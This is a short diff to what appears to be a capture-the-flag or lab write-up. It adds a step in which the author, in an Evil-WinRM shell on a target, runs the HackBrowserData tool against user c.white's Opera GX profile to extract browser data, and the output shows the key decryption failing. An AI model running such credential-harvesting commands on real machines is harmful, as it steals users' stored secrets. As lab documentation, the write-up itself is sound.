@@ -380,5 +380,15 @@ https://github.com/moond4rk/HackBrowserData
 Ill download the release from the github and upload the exe to the target 
 
 ```python
+*Evil-WinRM* PS C:\Users\c.white\Documents> .\hack-browser-data.exe -d . -b opera-gx -p "C:\Users\c.white\AppData\Roaming\Opera GX Stable"
+hack-browser-data.exe : [INF] Extracting OperaGX...
+    + CategoryInfo          : NotSpecified: ([INF] Extracting OperaGX...:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[WRN] OperaGX: master key retrieval: v10: DPAPI decrypt: CryptUnprotectData: Key not valid for use in specified state.[INF] Exported to ./[INF]   bookmark.json            2 entries[INF]   extension.json
+```
+
+This ran the tool and saved some results to the current directory
+
+```python
 
 ```
